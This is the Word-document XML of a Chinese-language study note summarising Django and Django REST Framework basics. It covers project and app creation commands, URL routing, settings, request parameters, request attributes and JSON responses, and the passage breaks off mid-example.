          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>扩展类，简化视图的编写；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8B7E95"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丰富的定制层级：函数视图、类视图、视图集合到自动生成</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> API</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，满足各种需要；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD8F647"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多种身份认证和权限认证方式的支持；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7982A185"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内置了限流系统；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE75583" w14:textId="77777777" w:rsidR="00D8288D"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直观的</w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> API web </w:t>
      </w:r>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>界面；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D3A052" w14:textId="237B5E8F" w:rsidR="00870C85" w:rsidRPr="00F17699" w:rsidRDefault="00870C85" w:rsidP="00BC6A81">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>可扩展性，插件丰富</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EBA5696" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00BC6A81" w:rsidRDefault="00870C85" w:rsidP="00BC6A81">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222226"/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222226"/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Django&amp;DRF重点内容大盘点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D988872" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>本文只是将学习过程中需要深刻记忆，在工作中常用的一些命令或者知识点进行一个罗列并阐释，不会全面的将所有内容进行讲解。大家可以在了解了Django框架和DRF框架之后再来看这边文章。否则会有点不知所云。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB729A0" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126418">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>1.Django</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C4990C"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1.1创建Django项目</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3130247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这一命令必须熟记于心：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF4EC6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django-admin startproject 项目名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351D5A0C"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1.2 创建子应用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42144E2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1.在工作中我们要开发很多项目，肯定需要很多模块，创建子应用肯定也需要掌握：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20073F8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python manage.py startapp 子应用名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511D069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：此命令需要在项目的目录下进行输入。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6191D16C"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2.创建完子应用中之后，千万不要忘记去INSTALLED_APPS中进行注册，这个参数在setting文件中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321C19E4"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1.3一个程序注意的点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1A0AC1"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1.3.1视图函数的定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311B808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1）定义视图函数之后，要有一个request形参接收请求对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071EA2F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2）返回的时候用到了HttpResponse这一命令返回响应对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D5EDB76"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1.3.2url地址的配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B160FC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1.在子应用中的urls.py文件中设置当前子应用中url地址和视图对应关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18679A23"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urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5990F293"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url(r'^url</w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>正则表达式</w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>$',views.</w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>视图函数名</w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B6E4A5"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B6E4F5B"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2.</w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>在项目总的</w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>urls.py</w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>文件中包含子应用中的</w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>urls.py</w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E71F7E"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urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AAFD88D"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url(r'^',include('users.urls'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07136069"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D663EB1"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1.4url配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267FB5A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在子应用中进行url地址的配置时，建议严格匹配开头和结尾，避免在地址匹配时候出错。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C68F86D"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1.5项目配置项</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320F33E2"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1.BASE_DIR指的是Django项目根目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C46271E"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2.语言和时区本地化：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A575E58"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LANGUAGE_CODE = 'zh-Hans' # </w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中文语言</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04CB5BDF"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TIME_ZONE = 'Asia/Shanghai' # </w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中国时间</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08901DE8"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lastRenderedPageBreak/>
        <w:t>1.6客户端向服务器传递参数途径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD800FC"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1.6.1通过URL地址传递参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48AA83C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在我们的url地址中的参数，我们如果想要获取可以在子应用中的urls文件中进行设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508D9CDE"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/weather/</w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>城市</w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="003714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>年份</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C7BFFF"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url(r'weather/(?P&lt;city&gt;\w+)/(?P&lt;year&gt;\d{4})/$'views.weather)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011D8131"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1.6.2通过查询字符串传递参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F1E953"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/qs/?a=1&amp;b=2&amp;a=3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5290FBA8"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def qs(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F132D8E"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a = request.GET.get('a')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC76C0A"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b = request.GET.get('b')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2688921A"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alist = request.GET.getlist('a')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6059BA72"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print(a)  # 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D52A0CC"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print(b)  # 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15EF95D8"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print(alist)  # ['1', '3']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235429F5" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="003714A9" w:rsidRDefault="00870C85" w:rsidP="003714A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3714A9">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">    return HttpResponse('OK')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDA4F1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重要：查询字符串不区分请求方式，即假使客户端进行POST方式的请求，依然可以通过request.GET获取请求中的查询字符串数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48199400"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1.6.3通过请求体传递数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="184FB21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1)post表单提交的数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="446F2FDC"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/form/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788BE429"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def form_data(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BCDF8C"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name = request.POST.get('name')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD8D201"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age = request.POST.get('age')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11FD4988"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return HttpResponse('OK')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CFA9FB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2)json数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75CE7AAF"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/json/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D457CCB"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def json_data(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD13CE8"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req_data = request.body</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1A5CDC"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json_str = req_data.decode()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51692FD3"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req_dict = json.loads(json_str)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B5C8B91"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">    name = req_dict.get('name')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38631251"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age = req_dict.get('age')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC282B2"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return HttpResponse('OK')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001CB545"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1.6.4通过请求头传递数据（了解即可）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6862B9EF"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1.6.5request对象的属性</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69"/>
        <w:gridCol w:w="2955"/>
      </w:tblGrid>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="51CB14D5" w14:textId="77777777" w:rsidTr="009E5F6C">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E83E390" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="002437D1">
            <w:pPr>
              <w:widowControl/>
              <w:spacing w:line="300" w:lineRule="exact"/>
              <w:contextualSpacing/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00126418">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>request请求对象的属性</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14BDD618" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00126418" w:rsidRDefault="00870C85" w:rsidP="002437D1">
            <w:pPr>
              <w:widowControl/>
              <w:spacing w:line="300" w:lineRule="exact"/>
              <w:contextualSpacing/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00126418">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>说明</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="22A5FB72" w14:textId="77777777" w:rsidTr="009E5F6C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="76EB1F78"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GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3523349B"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查询字符串参数</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="0DB88D44" w14:textId="77777777" w:rsidTr="009E5F6C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54AC15C9"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POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68CCA3E6"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请求体重的表单数据</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="42F62AE7" w14:textId="77777777" w:rsidTr="009E5F6C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7C1033F4"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body</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14A61812"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请求体中原始的bytes数据</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="1100D4A2" w14:textId="77777777" w:rsidTr="009E5F6C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78D8BAE1"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method</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D863736"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请求方式</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="2B90A168" w14:textId="77777777" w:rsidTr="009E5F6C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="67E9FF4D"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path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="16F40C82"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请求的url路径</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="460B7E8E" w14:textId="77777777" w:rsidTr="009E5F6C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="668CE5E0"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META</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="465BAD13"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请求头</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="0AB642A1" w14:textId="77777777" w:rsidTr="009E5F6C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4202E075"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COOKIES</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0369BE4D"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客户端发送的cookie信息</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00870C85" w:rsidRPr="00126418" w14:paraId="47EFF29E" w14:textId="77777777" w:rsidTr="009E5F6C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D26C5E0"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FILES</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2381DC5F"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客户端上传的文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5B3B6386"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1.7相应对象构造</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1065FA80"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1.7.1响应时返回json数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3347CCC7"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def get_json(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6487C4AF"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res_dict = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479157F9"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'name':'xiaoyan',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE8C29A"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'age':'18'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557E4AF0"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690DAD7B"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return JsonResponse(res_dict)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC52EC9"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1.7.2响应时进行页面重定向</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A0AC76"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def redirect_test(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="060503BC"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 </w:t>
      </w:r>
      <w:r w:rsidRPr="009E5F6C">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>第一个参数是</w:t>
      </w:r>
      <w:r w:rsidRPr="009E5F6C">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="009E5F6C">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，第二个参数是</w:t>
      </w:r>
      <w:r w:rsidRPr="009E5F6C">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
    </w:p>
